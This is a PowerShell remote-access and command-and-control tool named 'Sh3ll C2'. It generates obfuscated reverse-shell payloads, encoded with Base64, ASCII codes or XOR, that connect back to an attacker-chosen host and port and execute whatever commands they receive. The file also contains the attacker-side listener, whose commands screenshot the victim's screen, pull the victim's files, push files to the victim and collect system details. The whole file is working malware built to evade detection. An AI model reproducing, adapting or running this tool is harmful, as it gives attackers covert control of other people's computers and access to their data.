
                          

"<-----------------------------------------------------[Obfuscation_Starts]--------------------------------------------------->"
function Character_Obfuscation($String)
{
  $String = $String.toCharArray();
  
  Foreach($Letter in $String) 
  {
    
    If($RandomNumber -eq "1")
    {
      $Letter = "$Letter".ToLower();
    }

    If($RandomNumber -eq "2")
    {
      $Letter = "$Letter".ToUpper();
    }

    $RandomString += $Letter;
    $RandomNumber = $Null;
  }
  
  $String = $RandomString;
  Return $String;
}

function Variable_Obfuscation($String)
{
  $RandomVariable = (0..99);

  For($i = 0; $i -lt $RandomVariable.count; $i++)
  {
    $Temp = (-Join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}));

    While($RandomVariable -like "$Temp")
    {
      $Temp = (-Join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}));
    }

    $RandomVariable[$i] = $Temp;
    $Temp = $Null;
  }

  $RandomString = $String;

  For($x = $RandomVariable.count; $x -ge 1; $x--)
  {
  	$Temp = $RandomVariable[$x-1];
    $RandomString = "$RandomString" -replace "\`$$x", "`$$Temp";
  }

  $String = $RandomString;
  Return $String;
}

function ASCII_Obfuscation($String)
{
  $PowerShell = "IEX(-Join((@)|%{[char]`$_}));Exit";
  $CMD = "ECHO `"IEX(-Join((@)|%{[char]```$_}));Exit`" | PowerShell `"IEX(IEX(`$input))`"&Exit";
  
  $String = [System.Text.Encoding]::ASCII.GetBytes($String) -join ',';
  
  $PowerShell = Character_Obfuscation($PowerShell);
  $PowerShell = $PowerShell -replace "@","$String";

  $CMD = Character_Obfuscation($CMD);
  $CMD = $CMD -replace "@","$String";
  
  Return $PowerShell,$CMD;
}

function Base64_Obfuscation($String)
{
  $PowerShell = "IEX([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(([Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes({@})|Sort-Object {Get-Random -SetSeed #}))))));Exit";
  $CMD = "ECHO `"IEX([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(([Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes({@})|Sort-Object {Get-Random -SetSeed #}))))));Exit`" | PowerShell `"IEX(IEX(`$input))`"&Exit";
  
  $Seed = (Get-Random -Minimum 0 -Maximum 999999999).ToString('000000000');
  $String = [Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes([Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($String))) | Sort-Object {Get-Random -SetSeed $Seed}));
  
  $PowerShell = Character_Obfuscation($PowerShell);
  $PowerShell = $PowerShell -replace "@","$String";
  $PowerShell = $PowerShell -replace "#","$Seed";

  $CMD = Character_Obfuscation($CMD);
  $CMD = $CMD -replace "@","$String";
  $CMD = $CMD -replace "#","$Seed";

  Return $PowerShell,$CMD;
}

function BXOR_Obfuscation($String)
{
  $PowerShell = "IEX(-Join((@)|%{[char](`$_-BXOR #)}));Exit";
  $CMD = "ECHO `"IEX(-Join((@)|%{[char](```$_-BXOR #)}));Exit`" | PowerShell `"IEX(IEX(`$input))`"&Exit";

  $Key = '0x' + ((0..5) | Get-Random) + ((0..9) + ((65..70) + (97..102) | % {[char]$_}) | Get-Random);
  $String = ([System.Text.Encoding]::ASCII.GetBytes($String) | % {$_ -BXOR $Key}) -join ',';
  
  $PowerShell = Character_Obfuscation($PowerShell);
  $PowerShell = $PowerShell -replace "@","$String";
  $PowerShell = $PowerShell -replace "#","$Key";

  $CMD = Character_Obfuscation($CMD);
  $CMD = $CMD -replace "@","$String";
  $CMD = $CMD -replace "#","$Key";

  Return $PowerShell,$CMD;
}

function Payload($IP,$Port,$Base64_Key)
{
  $Payload = "`$1=[System.Byte[]]::CreateInstance([System.Byte],1024);`$2=([Convert]::FromBase64String(`"@`"));`$3=`"#`";`$4=IEX([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR((`$3|ConvertTo-SecureString -Key `$2))));While(`$5=`$4.GetStream()){;While(`$5.DataAvailable -or `$6 -eq `$1.count){;`$6=`$5.Read(`$1,0,`$1.length);`$7+=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$1,0,`$6)};If(`$7){;`$8=(IEX(`$7)2>&1|Out-String);If(!(`$8.length%`$1.count)){;`$8+=`" `"};`$9=([text.encoding]::ASCII).GetBytes(`$8);`$5.Write(`$9,0,`$9.length);`$5.Flush();`$7=`$Null}}";

  $Key = ([Convert]::FromBase64String($Base64_Key));
  $C2 = ConvertTo-SecureString "New-Object System.Net.Sockets.TCPClient('$IP',$Port)" -AsPlainText -Force | ConvertFrom-SecureString -Key $Key;

  $Payload = Variable_Obfuscation(Character_Obfuscation($Payload));
  $Payload = $Payload -replace "@","$Base64_Key";
  $Payload = $Payload -replace "#","$C2";

  Return $Payload;
}

"<----------------------------------------------[Obfuscation_Ends]------------------------------------------------------------>"

$banner = @"

                  <~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                  |                                                           |
                  |               _     _____ _ _          ____               |
                  |           ___| |__ |___ /| | |     ___|___ \              |
                  |          / __| '_ \  |_ \| | |    / __| __) |             |
                  |          \__ | | | |___) | | |   | (__ / __/              |
                  |          |___|_| |_|____/|_|_|    \___|_____|             |
                  |                                                By:-[ar.p] |
                  |                                                           |
                  <~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
"@;

Clear-Host;
Write-Host "`n$banner";
Write-Host "`n";

Write-Host " [-] lhost > " -NoNewline;
$Local_Host = Read-Host;

While(!($Local_Port))
{
  Write-Host " [-] lport > " -NoNewline;
  $Local_Port = Read-Host;

  netstat -na | Select-String LISTENING | % {
  
  If(($_.ToString().split(":")[1]) -eq "$Local_Port")
  {
    $Local_Port = $Null;
  }
 }
}

$Key = (1..32 | % {[byte](Get-Random -Minimum 0 -Maximum 255)});
$Base64_Key = [Convert]::ToBase64String($Key);

$Payload = Payload -IP $Local_Host -Port $Local_Port -Base64_Key $Base64_Key;

$Choices = (1..3);
While(!($Choices -like "$Choice"))
{
  Write-Host "`n [~] Select Obfuscation Type: [~]";
  Write-Host " (1) :- Base64 (recommended)";
  Write-Host " (2) :- ASCII";
  Write-Host " (3) :- BXOR";

  Write-Host "`n >>> " -NoNewline;
  $Choice = Read-Host;
}

Clear-Host;
Write-Host $banner;

Write-Host " [-] lhost > $Local_Host";
Write-Host " [-] lport > $Local_Port";

If($Choice -eq "1")
{
  Write-Host "`n [~] Obfuscation Type: Base64 [~]";
  $Payload = Base64_Obfuscation($Payload);
}

If($Choice -eq "2")
{
  Write-Host "`n [~] Obfuscation Type: ASCII [~]";
  $Payload = ASCII_Obfuscation($Payload);
}

If($Choice -eq "3")
{
  Write-Host "`n [~] Obfuscation Type: B-XOR [~]";
  $Payload = BXOR_Obfuscation($Payload);
}

$PowerShell_Payload = $Payload[0];
$CMD_Payload = $Payload[1];

Write-Host "`n [~] PowerShell Payload: [~]`n`n$PowerShell_Payload";
Write-Host "`n [~] CMD Payload: [~]`n`n$CMD_Payload`n";

$Bytes = [System.Byte[]]::CreateInstance([System.Byte],1024);
Write-Host "`n [~] Listening on Port `"$Local_Port`" [~]";
$Socket = New-Object System.Net.Sockets.TcpListener('0.0.0.0',$Local_Port);
$Socket.Start();
$Client = $Socket.AcceptTcpClient();
$Remote_Host = $Client.Client.RemoteEndPoint.Address.IPAddressToString;
Write-Host "`n [~]__________________________________________[Connected to:`"$Remote_Host`"]___________________________________________[~]";


$Stream = $Client.GetStream();
$WaitData = $False;
$info = $Null;
$System = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).Caption");
$Version = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).Version");
$Architecture = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).OSArchitecture");
$Name = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).CSName");
$WindowsDirectory = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).WindowsDirectory");



$help = "                                                                                                           
                                                                                              
      info        --> Shows victim info.                           
      upload      --> uploads File from attacker to victim.        
      download    --> downloads File from attacker to victim.      
      screenshot  --> Save screenshot to attacker.                 
      help        --> Shows C2 Commands.                           
                                                                         
";



While($Client.Connected)
{
  If(!($WaitData))
  {
    If(!($Command))
    {
      Write-Host "`n";
      Write-Host "`nSh3ll:~$ " -NoNewline;
      $Command = Read-Host;
    }
    

    If($Command -eq "help")
    {
      Write-Host "`n$help";
      $Command = $Null;
    }

    If($Command -eq "info")
    {
      $Command = "`" victim: `"+`"$Remote_Host`"+`"``n sys: `"+$System+`"``n ver: `"+$Version+`"``n archi: `"+$Architecture+`"``n name: `"+$Name+`"``n dir: `"+$WindowsDirectory";
    }
    
    If($Command -eq "screenshot")
    {
      $File = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_});
      Write-Host "`n - screenshot File: $File.png";
      Write-Host "`n [~] ... Please Wait ... [~]";
      $Command = "`$1=`"`$env:temp\#`";Add-Type -AssemblyName System.Windows.Forms;`$2=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);`$3=[System.Drawing.Graphics]::FromImage(`$2);`$3.CopyFromScreen((New-Object System.Drawing.Point(0,0)),(New-Object System.Drawing.Point(0,0)),`$2.Size);`$3.Dispose();`$2.Save(`"`$1`");If(([System.IO.File]::Exists(`"`$1`"))){[io.file]::ReadAllBytes(`"`$1`") -join ',';Remove-Item -Path `"`$1`" -Force}";
      $Command = Variable_Obfuscation(Character_Obfuscation($Command));
      $Command = $Command -replace "#","$File";
      $File = "$pwd\$File.png";
      $Save = $True;
    }

    If($Command -eq "download")
    {
      Write-Host "`n [-] download File: " -NoNewline;
      $File = Read-Host;

      If(!("$File" -like "* *") -and !([string]::IsNullOrEmpty($File)))
      {
        Write-Host "`n [~] ... Please Wait ... [~]";
        $Command = "`$1=`"#`";If(!(`"`$1`" -like `"*\*`") -and !(`"`$1`" -like `"*/*`")){`$1=`"`$pwd\`$1`"};If(([System.IO.File]::Exists(`"`$1`"))){[io.file]::ReadAllBytes(`"`$1`") -join ','}";
        $Command = Variable_Obfuscation(Character_Obfuscation($Command));
        $Command = $Command -replace "#","$File";
        $File = $File.Split('\')[-1];
        $File = $File.Split('/')[-1];
        $File = "$pwd\$File";
        $Save = $True;
      
      } Else {

        Write-Host "`n";
        $File = $Null;
        $Command = $Null;
      }
    }

    If($Command -eq "upload")
    {
      Write-Host "`n [-] upload File: " -NoNewline;
      $File = Read-Host;

      If(!("$File" -like "* *") -and !([string]::IsNullOrEmpty($File)))
      {
        Write-Host "`n [~] ... Please Wait ... [~]";

        If(!("$File" -like "*\*") -and !("$File" -like "*/*"))
        {
          $File = "$pwd\$File";
        }

        If(([System.IO.File]::Exists("$File")))
        {
          $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
          $FileBytes = "($FileBytes)";
          $File = $File.Split('\')[-1];
          $File = $File.Split('/')[-1];
          $Command = "`$1=`"`$pwd\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1 [*]`"}";
          $Command = Variable_Obfuscation(Character_Obfuscation($Command));
          $Command = $Command -replace "#","$File";
          $Command = $Command -replace "@","$FileBytes";
          $upload = $True;

        } Else {

          Write-Host " [~] !!! Failed !!! [~]";
          Write-Host " [~] File is Missing [~]`n";
          $Command = $Null;
        }

      } Else {

        Write-Host "`n";
        $Command = $Null;
      }

      $File = $Null;
    }

    If(!([string]::IsNullOrEmpty($Command)))
    {
      If(!($Command.length % $Bytes.count))
      {
        $Command += " ";
      }

      $SendByte = ([text.encoding]::ASCII).GetBytes($Command);

      Try {

        $Stream.Write($SendByte,0,$SendByte.length);
        $Stream.Flush();
      }

      Catch {

        Write-Host "`n [~] !!! Connection Lost !!! [~]`n";
        $Socket.Stop();
        $Client.Close();
        $Stream.Dispose();
        Exit;
      }

      $WaitData = $True;
    }

    If($Command -eq "Exit")
    {
      Write-Host "`n [~] !!! Connection Lost !!! [~]`n";
      $Socket.Stop();
      $Client.Close();
      $Stream.Dispose();
      Exit;
    }

    If($Command -eq "Clear" -or $Command -eq "Cls" -or $Command -eq "Clear-Host")
    {
      Clear-Host;
      Write-Host "`n$banner";
    }

    $Command = $Null;
  }

  If($WaitData)
  {
    While(!($Stream.DataAvailable))
    {
      Start-Sleep -Milliseconds 1;
    }

    If($Stream.DataAvailable)
    {
      While($Stream.DataAvailable -or $Read -eq $Bytes.count)
      {
        Try {

          If(!($Stream.DataAvailable))
          {
            $Temp = 0;

            While(!($Stream.DataAvailable) -and $Temp -lt 1000)
            {
              Start-Sleep -Milliseconds 1;
              $Temp++;
            }

            If(!($Stream.DataAvailable))
            {
              Write-Host "`n [~] !!! Connection Lost !!! [~]`n";
              $Socket.Stop();
              $Client.Close();
              $Stream.Dispose();
              Exit;
            }
          }

          $Read = $Stream.Read($Bytes,0,$Bytes.length);
          $OutPut += (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0,$Read);
        }

        Catch {

          Write-Host "`n [~] !!! Connection Lost !!! [~]`n";
          $Socket.Stop();
          $Client.Close();
          $Stream.Dispose();
          Exit;
        }
      }

      If(!($info))
      {
        $info = "$OutPut";
      }

      If($OutPut -ne " " -and !($Save) -and !($upload))
      {
        Write-Host "`n$OutPut";
      }

      If($Save)
      {
        If($OutPut -ne " ")
        {
          If(!([System.IO.File]::Exists("$File")))
          {
            $FileBytes = IEX("($OutPut)");
            [System.IO.File]::WriteAllBytes("$File",$FileBytes);
            Write-Host " [~] !!! Success !!! [~]";
            Write-Host " [~] File Saved: $File [~]`n";

          } Else {

            Write-Host " [~] !!! Failed !!! [~]";
            Write-Host " [~] File already Exists [~]`n";
          }
        }   Else {

            Write-Host " [~] !!! Failed !!! [~]";
            Write-Host " [~] File Missing [~]`n";
        }

        $File = $Null;
        $Save = $False;
      }

      If($upload)
      {
        If($OutPut -ne " ")
        {
          $OutPut = $OutPut -replace "`n","";
          Write-Host " [~] !!! Success !!! [~]";
          Write-Host " [~] File uploaded: $OutPut`n";

        } Else {

          Write-Host " [~] !!! Failed !!! [~]";
          Write-Host " [~] File already Exists [~]`n";
        }

        $upload = $False;
      }

    $WaitData = $False;
    $Read = $Null;
    $OutPut = $Null;
  }
 }
}